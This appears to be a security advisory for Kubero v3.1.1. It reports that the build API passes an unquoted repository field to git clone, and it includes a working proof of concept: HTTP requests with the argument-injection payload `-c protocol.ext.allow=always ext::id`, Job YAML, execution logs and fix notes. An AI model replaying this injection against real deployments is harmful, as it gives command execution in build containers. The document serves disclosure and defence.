### Vulnerability details

**Official website / Product:** https://www.kubero.dev / https://github.com/kubero-dev/kubero

**Repository:** kubero-dev/kubero (stars at selection: 4458)

**Vulnerability type:** RCE (Git clone argument injection → `ext::` command execution)

**Vulnerability versions:** audited `11c5abf6bdb8d6147a63539d03f57a9b063ab55b` / image `ghcr.io/kubero-dev/kubero/kubero:v3.1.1` (digest `85302cefaae5`; current main; affects build pipeline using `ghcr.io/kubero-dev/fetch`)

**Vulnerability URL / Parameter:** `POST /api/deployments/build/:pipeline/:phase/:app` JSON field `repository` (mapped to Job env `GIT_REPOSITORY`)

**Complex:** yes

### Verification procedure

1. Run Kubero UI `v3.1.1`: container name `kubero-r18a3`, `network_mode: host`, `PORT=19803` (reach `http://127.0.0.1:19803`). Image: `ghcr.io/kubero-dev/kubero/kubero:v3.1.1` (digest `85302cefaae5`). Provide a reachable Kubernetes API: kind cluster `kubero-r18a3` (node `kindest/node:v1.32.2`) and build namespace `testpipe-production` (ServiceAccount `testapp-kuberoapp` + `deployment-keys` secret as required by the fetch template). Audited commit: `11c5abf6bdb8d6147a63539d03f57a9b063ab55b`. Example compose (UI side; also mount a kubeconfig into the container and point Kubero at that API):

```yaml
services:
  kubero:
    image: ghcr.io/kubero-dev/kubero/kubero:v3.1.1
    container_name: kubero-r18a3
    network_mode: host
    environment:
      PORT: "19803"
      KUBERO_ADMIN_PASSWORD: "adminadmin123"
```

2. Log in with the lab seeded admin to obtain a JWT: username `admin`, password `adminadmin123` (from `.env` / compose `KUBERO_ADMIN_PASSWORD`).

```http
POST /api/auth/login HTTP/1.1
Host: 127.0.0.1:19803
Content-Type: application/json
Connection: close

{"username":"admin","password":"adminadmin123"}
```

The Bearer JWT expires; the `Authorization` value in the PoC below is a lab-captured token — re-login and replace it when replaying. The build route only uses `JwtAuthGuard` + `ReadonlyGuard` (no `PermissionsGuard` / `app:write`), so any authenticated principal that can obtain a JWT can trigger the Job.

3. `POST /api/deployments/build/testpipe/production/testapp` with `repository` set to `-c protocol.ext.allow=always ext::id` (not a URL).
4. Observe the created Job (e.g. `testapp-testpipe-20261101-1843` in namespace `testpipe-production`): the fetch initContainer env `GIT_REPOSITORY` equals that value:

```yaml
# API-created Job (testapp-testpipe-20261101-1843 / testpipe-production) fetch initContainer excerpt
initContainers:
- env:
  - name: GIT_REPOSITORY
    value: -c protocol.ext.allow=always ext::id
  - name: GIT_REF
    value: main
  - name: KUBERO_BUILDPACK_DEFAULT_RUN_CMD
    value: exit 0
  - name: KUBERO_BUILDPACK_DEFAULT_BUILD_CMD
    value: exit 0
  image: ghcr.io/kubero-dev/fetch:latest
  imagePullPolicy: Always
  name: fetch
  volumeMounts:
  - mountPath: /home/kubero/.ssh-mounted
    name: deployment-keys
    readOnly: true
  - mountPath: /app
    name: app-storage
  workingDir: /app
```

5. When the fetch container runs `init.sh`, unquoted `git clone --recurse-submodules $GIT_REPOSITORY .` executes `id` via Git’s `ext::` remote helper; logs show `fatal: protocol error: bad line length character: uid=`.

**Lab note:** Build Jobs from the API use `imagePullPolicy: Always` for `ghcr.io/kubero-dev/fetch`. If the kind node HTTP_PROXY breaks pulls, reuse the **same** `GIT_REPOSITORY` value with `IfNotPresent` against the fetch image previously `kind load`ed:

```yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: rce-git-ext-proof
  namespace: testpipe-production
spec:
  backoffLimit: 0
  ttlSecondsAfterFinished: 600
  template:
    spec:
      restartPolicy: Never
      serviceAccountName: testapp-kuberoapp
      containers:
      - name: fetch
        image: ghcr.io/kubero-dev/fetch:latest
        imagePullPolicy: IfNotPresent
        workingDir: /app
        env:
        - name: GIT_REPOSITORY
          value: -c protocol.ext.allow=always ext::id
        - name: GIT_REF
          value: main
        - name: KUBERO_BUILDPACK_DEFAULT_RUN_CMD
          value: exit 0
        - name: KUBERO_BUILDPACK_DEFAULT_BUILD_CMD
          value: exit 0
        volumeMounts:
        - mountPath: /home/kubero/.ssh-mounted
          name: deployment-keys
          readOnly: true
        - mountPath: /app
          name: app-storage
      volumes:
      - name: deployment-keys
        secret:
          secretName: deployment-keys
      - name: app-storage
        emptyDir: {}
```

Impact verification (fetch container logs; `kubectl logs job/rce-git-ext-proof -n testpipe-production -c fetch` or the API Job’s fetch initContainer):

```text
========== debug
GIT_REPOSITORY: -c protocol.ext.allow=always ext::id
GIT_REF: main
KUBERO_BUILDPACK_DEFAULT_BUILD_CMD: exit 0
KUBERO_BUILDPACK_DEFAULT_RUN_CMD: exit 0
User: kubero
ID: uid=1000(kubero) gid=1000(kubero) groups=1000(kubero)
Home: /home/kubero
PWD: /app
========== copy ssh keys
mode of '/home/kubero/.ssh' changed to 0700 (rwx------)
mode of '/home/kubero/.ssh/deploykey' changed to 0600 (rw-------)
mode of '/home/kubero/.ssh/known_hosts' changed to 0644 (rw-r--r--)
========== whipe the app dir
Done
========== Clone Repository from -c protocol.ext.allow=always ext::id
Cloning into '.'...
fatal: protocol error: bad line length character: uid=
```

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
POST /api/deployments/build/testpipe/production/testapp HTTP/1.1
Host: 127.0.0.1:19803
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIyIiwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsInVzZXJHcm91cHMiOlsiYWRtaW4iLCJldmVyeW9uZSJdLCJwZXJtaXNzaW9ucyI6WyJhcHA6d3JpdGUiLCJwaXBlbGluZTp3cml0ZSIsInVzZXI6d3JpdGUiLCJjb25maWc6d3JpdGUiLCJjb25zb2xlOm9rIiwibG9nczpvayIsInJlYm9vdDpvayIsImF1ZGl0OnJlYWQiLCJ0b2tlbjp3cml0ZSIsInNlY3VyaXR5OndyaXRlIl0sInN0cmF0ZWd5IjoibG9jYWwiLCJpYXQiOjE3OTM1NTg1OTYsImV4cCI6MTc5MzU5NDU5Nn0.z8U2iPXhfItp4graORasEJTPfK3eAon4_nLsEldpr4Y
Content-Type: application/json
Content-Length: 138
Connection: close

{"buildstrategy": "dockerfile", "repository": "-c protocol.ext.allow=always ext::id", "reference": "main", "dockerfilePath": "Dockerfile"}
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 201
Cross-Origin-Resource-Policy: same-origin
Origin-Agent-Cluster: ?1
Referrer-Policy: no-referrer
X-Content-Type-Options: nosniff
X-DNS-Prefetch-Control: off
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
X-XSS-Protection: 0
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
Content-Length: 27
ETag: W/"1b-MQZ0Ok0pO1yyTK83SZtpyYWVyoY"
Date: Sun, 01 Nov 2026 18:43:16 GMT
Connection: close

{"message":"Build started"}
```

Verification result notes:

- API returned `201` with `{"message":"Build started"}` and created a batch Job (e.g. `testapp-testpipe-20261101-1843`) whose fetch container env is `GIT_REPOSITORY=-c protocol.ext.allow=always ext::id` (see Job excerpt above).
- Fetch container logs show Git invoking `ext::id` and failing with `bad line length character: uid=`, which is stdout from the executed `id` command (uid=…) being mis-parsed as the Git pack protocol — proving arbitrary command execution in the build fetch container (uid=1000 kubero in the image).

### Vulnerability analysis

`POST /api/deployments/build/:pipeline/:phase/:app` accepts attacker-controlled `body.repository` and passes it to `KubernetesService.createBuildJob` as `git.url`, which is written into the build Job template as `GIT_REPOSITORY` for the `fetch` initContainer (`ghcr.io/kubero-dev/fetch`).

The fetch image `init.sh` runs:

```sh
git clone --recurse-submodules $GIT_REPOSITORY .
```

Because `$GIT_REPOSITORY` is unquoted, spaces allow injecting extra `git clone` arguments. Prefixing `-c protocol.ext.allow=always` and using a repository “URL” of `ext::id` enables Git’s external remote helper to execute `id` (or other commands) inside the container. This is not the intended “clone this HTTPS/SSH URL” behavior and is distinct from supplying a malicious Dockerfile/Procfile in a real repository.

The build endpoint is only wrapped with `JwtAuthGuard` + `ReadonlyGuard` — there is no `PermissionsGuard` / `app:write` check — so any authenticated principal that can obtain a JWT can trigger the Job.

Trigger / sink source (full path and line numbers):

```typescript
# File: server/src/deployments/deployments.controller.ts
# Lines: 51-90
  @Post('/build/:pipeline/:phase/:app')
  @UseGuards(JwtAuthGuard)
  @UseGuards(ReadonlyGuard)
  async buildApp(
    @Param('pipeline') pipeline: string,
    @Param('phase') phase: string,
    @Param('app') app: string,
    @Body() body: CreateBuild,
    @Request() req: any,
  ) {
    // ... auth user extraction ...
    return this.deploymentsService.triggerBuildjob(
      pipeline,
      phase,
      app,
      body.buildstrategy,
      body.repository,
      body.reference,
      body.dockerfilePath,
      user,
    );
  }
```

```typescript
# File: server/src/kubernetes/kubernetes.service.ts
# Lines: 1309-1310
    job.spec.template.spec.initContainers[0].env[0].value = git.url;
    job.spec.template.spec.initContainers[0].env[1].value = git.ref;
```

```sh
# File: ghcr.io/kubero-dev/fetch image /init.sh (runtime sink)
# Relevant lines in image init.sh
git clone --recurse-submodules $GIT_REPOSITORY .
git checkout $GIT_REF
```

### Fix notes

1. Treat `repository` as a URL only: validate scheme (`https://`, `git@`, `ssh://`) and reject values starting with `-` or containing control/IFS abuse.
2. Pass the URL to `git` as a separate argv without shell word-splitting (e.g. `git clone --recurse-submodules -- "$GIT_REPOSITORY" .` after validation, or prefer `execFile` without a shell).
3. Disable `protocol.ext` / dangerous Git protocols in the fetch image (`git config --system protocol.ext.allow never`, similarly for `protocol.file` as needed).
4. Add `PermissionsGuard` + `app:write` (and ownership checks) on the build route.
